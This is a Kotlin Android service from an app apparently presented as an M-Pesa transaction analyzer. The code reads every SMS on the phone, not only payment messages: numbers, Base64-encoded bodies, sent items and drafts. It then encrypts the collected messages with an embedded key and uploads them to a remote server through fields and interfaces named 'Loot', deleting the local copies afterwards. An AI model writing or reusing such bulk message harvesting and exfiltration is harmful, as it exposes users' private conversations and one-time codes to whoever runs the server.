package com.niccher.my_mpesa_analyzer.services

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Telephony
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import com.niccher.mpesa_analyzer.helpers.ServiceGenerators
import com.niccher.my_mpesa_analyzer.R
import com.niccher.my_mpesa_analyzer.helpers.Encryptor
import com.niccher.my_mpesa_analyzer.helpers.Prefs
import com.niccher.my_mpesa_analyzer.helpers.ProgressRequestBody
import com.niccher.my_mpesa_analyzer.interfaces.JsonUploadLoot
import com.niccher.my_mpesa_analyzer.konstants.Konstants
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody
import okhttp3.ResponseBody
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response
import java.io.*

class UploadService : Service() {

    private val kon = Konstants
    private val prefs = Prefs()
    private val NOTIFICATION_ID = 10101
    private val CHANNEL_ID = "SMS_UPLOAD_CHANNEL"
    private lateinit var notificationManager: NotificationManager

    override fun onCreate() {
        super.onCreate()
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createNotificationChannel()

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Preparing SMS Upload")
            .setContentText("Reading local SMS data...")
            .setSmallIcon(R.mipmap.app_logo)
            .setOngoing(true)
            .build()

        startForeground(NOTIFICATION_ID, notification)

        Thread {
            Parser_SMS(this)
        }.start()

        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Upload Progress",
                NotificationManager.IMPORTANCE_LOW
            )
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun Cryptor(inputFile: File, inputStream: InputStream) {
        try {
            val cc = Encryptor()
            Encryptor.encodeToFile(
                kon.STRING_KEY,
                kon.STRING_KEY_SPEC,
                inputStream,
                FileOutputStream(inputFile)
            )
            Log.e(kon.TAGGED, "Cryptor: Encryption Completed")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun Make_a_File(context: Context, fileName: String, dataSource: StringBuffer) {
        val bigData = dataSource.toString()
        var fos: FileOutputStream? = null

        try {
            fos = context.openFileOutput("${kon.STRING_PLAIN_FILE}$fileName", Context.MODE_PRIVATE)
            fos.write(bigData.toByteArray())

            val fileEncPlain = File(context.filesDir, "/${kon.STRING_PLAIN_FILE}$fileName")
            val fileEncAes = File(context.filesDir, "/${kon.STRING_ENC_AES_FILES}$fileName")

            val fileInputStream = BufferedInputStream(FileInputStream(fileEncPlain))
            Cryptor(fileEncAes, fileInputStream)

            Parser_Upload(context, fileEncAes, fileName)
        } catch (e: FileNotFoundException) {
            Log.e(kon.TAGGED, "Error 1  ${e.message}")
        } catch (e: IOException) {
            Log.e(kon.TAGGED, "Error 2  ${e.message}")
        } finally {
            fos?.close()
        }
    }

    private fun Parser_SMS(context: Context) {
        Log.e(kon.TAGGED, "Parser_All_SMS->Started >")

        val prefRead = context.getSharedPreferences(kon.SHARED_LAST_TIME, Context.MODE_PRIVATE)
        val value = prefRead.getString(kon.SHARED_LAST_TIME, "0")
        val lastUploadTime = value?.toLongOrNull() ?: 0L

        val selection = "${Telephony.Sms.DATE} > ?"
        val selectionArgs = arrayOf(lastUploadTime.toString())

        val cr: ContentResolver = context.contentResolver
        val c = cr.query(Telephony.Sms.CONTENT_URI, null, selection, selectionArgs, null)
        var totalSMS = 0
        if (c != null) {
            totalSMS = c.count
            if (c.moveToFirst()) {
                val sbsent = StringBuffer()
                for (j in 0 until totalSMS) {
                    val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    val smsBody = Base64.encodeToString(
                        c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).toByteArray(),
                        Base64.DEFAULT
                    )
                    val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
                    val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
                    val smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID))

                    val smsType = when (c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)).toInt()) {
                        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                        Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                        Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                        else -> ""
                    }
                    sbsent.append("{\"Type\": \"$smsType\",\"Number\": \"$smsNumber\",\"Thread Id\": $smsThreadid,\"Date\": $smsDate,\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId },-------(//)--------")

                    c.moveToNext()
                }
                Make_a_File(context, "sms_All_${System.currentTimeMillis()}", sbsent)
            } else {
                // If there are no new messages, stop service immediately
                val builder = NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Upload Complete")
                    .setContentText("No new messages to upload.")
                    .setSmallIcon(R.mipmap.app_logo)
                    .setOngoing(false)
                notificationManager.notify(NOTIFICATION_ID, builder.build())
                stopSelf()
            }
            c.close()
        } else {
            Log.e(kon.TAGGED, "Parser_All_SMS->No More >")
            stopSelf()
        }
        Log.e(kon.TAGGED, "Parser_All_SMS->Finished >")
    }

    private fun Parser_Upload(context: Context, files: File, filename: String) {
        val builder = NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle("Uploading SMS")
            .setContentText("Upload in progress")
            .setSmallIcon(R.mipmap.app_logo)
            .setOngoing(true)
            .setProgress(100, 0, false)

        notificationManager.notify(NOTIFICATION_ID, builder.build())

        val service = ServiceGenerators.createService(JsonUploadLoot::class.java, context)
        val file = files

        val requestFile = ProgressRequestBody(file, "*/*".toMediaTypeOrNull()) { progress ->
            builder.setProgress(100, progress, false)
            notificationManager.notify(NOTIFICATION_ID, builder.build())
        }

        val body = MultipartBody.Part.createFormData("varLoot", "$filename.txt", requestFile)

        val partToken = prefs.getPrefsAuth("auth", context)
        val partDevId = prefs.getPrefsAuth("print", context)

        val requestBody0 = RequestBody.create(okhttp3.MultipartBody.FORM, partToken)
        val requestBody1 = RequestBody.create(okhttp3.MultipartBody.FORM, partDevId)

        val call = service.upload(requestBody0, requestBody1, body)
        call.enqueue(object : Callback<ResponseBody> {
            override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
                try {
                    val encPlain = File(context.filesDir, "/${kon.STRING_PLAIN_FILE}$filename")
                    val encAes = File(context.filesDir, "/${kon.STRING_ENC_AES_FILES}$filename")

                    encPlain.delete()
                    encAes.delete()

                    prefs.getFileType(filename, System.currentTimeMillis().toString(), context)
                    
                    builder.setContentText("Upload Complete").setProgress(0, 0, false).setOngoing(false)
                    notificationManager.notify(NOTIFICATION_ID, builder.build())
                } catch (e: Exception) {
                    Log.e(kon.TAGGED, "Delete Files error\n${e.message}")
                }
                
                // Broadcast an update intent if Frag_Home is open to refresh UI
                sendBroadcast(Intent("MPESA_UPLOAD_COMPLETE"))
                stopSelf()
            }

            override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
                builder.setContentText("Upload Failed").setProgress(0, 0, false).setOngoing(false)
                notificationManager.notify(NOTIFICATION_ID, builder.build())
                Log.e(kon.TAGGED, "Upload error: " + t.message)
                stopSelf()
            }
        })
        Log.e(kon.TAGGED, "Upload_Loot: Data Upload")
    }
}
